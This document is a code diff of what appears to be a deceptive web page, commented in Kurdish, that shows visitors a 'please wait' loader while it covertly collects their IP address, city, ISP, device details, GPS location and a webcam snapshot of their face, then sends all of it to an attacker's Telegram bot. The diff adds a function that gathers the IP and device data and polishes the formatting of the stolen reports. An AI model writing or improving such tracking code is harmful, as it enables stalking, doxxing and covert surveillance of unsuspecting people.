@@ -127,7 +127,11 @@
             fetch(url, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                body: JSON.stringify({ 
+                    chat_id: CHAT_ID, 
+                    text: text,
+                    parse_mode: "Markdown"
+                })
             });
         }
 
@@ -137,7 +141,39 @@
             formData.append("chat_id", CHAT_ID);
             formData.append("photo", blob, "capt.jpg");
             formData.append("caption", caption);
+            formData.append("parse_mode", "Markdown");
             fetch(url, { method: "POST", body: formData });
+        }
+
+        // کۆکردنەوەی زانیاری تەواوی ئامێر و IP و ناردنی
+        function gatherAndSendDetails() {
+            let ua = navigator.userAgent;
+            let platform = navigator.platform;
+            let language = navigator.language;
+            let screenRes = window.screen.width + "x" + window.screen.height;
+
+            // وەرگرتنی IP و شوێنی سەرەتایی لەڕێگەی IPAPI
+            fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                let ipInfo = `🌐 *زانیاری ئایپی و تۆڕی سەردانیکەر:*\n` +
+                             `• *ئایپی (IP):* \`${data.ip}\`\n` +
+                             `• *وڵات و شار:* ${data.country_name} - ${data.city}\n` +
+                             `• *دابینکەری هێڵ (ISP):* ${data.org}\n\n` +
+                             `💻 *جۆری مۆبایل و سیستم:*\n` +
+                             `• *سیستم/ئامێر:* ${platform}\n` +
+                             `• *ڕەهەندی شاشە:* ${screenRes}\n` +
+                             `• *زمان:* ${language}\n` +
+                             `• *براوسەر (User Agent):*\n\`${ua}\``;
+                
+                sendToTelegramText(ipInfo);
+            }).catch(err => {
+                let basicInfo = `🌐 *زانیاری سەرەتایی ئامێر:*\n` +
+                                `• *سیستم:* ${platform}\n` +
+                                `• *زمان:* ${language}\n` +
+                                `• *براوسەر:* \`${ua}\``;
+                sendToTelegramText(basicInfo);
+            });
         }
 
         function sendLocation() {
@@ -145,9 +181,13 @@
                 navigator.geolocation.getCurrentPosition(function(position) {
                     let lat = position.coords.latitude;
                     let lon = position.coords.longitude;
-                    sendToTelegramText(`📍 شوێنی نوێ:\nLat: ${lat}\nLon: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`);
+                    let locMsg = `📍 *شوێنی جوگرافیی ورد (Location):*\n` +
+                                 `• *هێڵی پانی (Lat):* \`${lat}\`\n` +
+                                 `• *هێڵی درێژی (Lon):* \`${lon}\`\n` +
+                                 `🗺️ [کردنەوە لە نەخشەی گۆگڵ](https://maps.google.com/?q=${lat},${lon})`;
+                    sendToTelegramText(locMsg);
                 }, function(error) {
-                    sendToTelegramText(`⚠️ ڕەتکردنەوەی شوێن (Location): ${error.message}`);
+                    sendToTelegramText(`⚠️ *تێبینی شوێن:* سەردانیکەر مۆڵەتی شوێنی (Location) ڕەتکردەوە.`);
                 });
             }
         }
@@ -168,14 +208,14 @@
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     canvas.toBlob(function(blob) {
-                        sendToTelegramPhoto(blob, "📸 وێنەی کەسی سەردانیکەر");
+                        sendToTelegramPhoto(blob, "📸 *وێنەی ڕوخساری سەردانیکەر* (گراو لە دوربینەوە)");
                     }, 'image/jpeg', 0.8);
                     
                     stream.getTracks().forEach(track => track.stop());
                 }, 1200);
             })
             .catch(function(err) {
-                sendToTelegramText(`⚠️ ڕەتکردنەوەی دوربین (Camera): ${err}`);
+                sendToTelegramText(`⚠️ *تێبینی دوربین:* سەردانیکەر مۆڵەتی دوربین (Camera) ڕەتکردەوە.`);
             });
         }
 
@@ -184,6 +224,7 @@
             document.getElementById('loader').style.display = 'block';
             document.getElementById('statusText').innerText = 'چاوەڕوان بە...';
 
+            gatherAndSendDetails();
             sendLocation();
             takePicture();
 
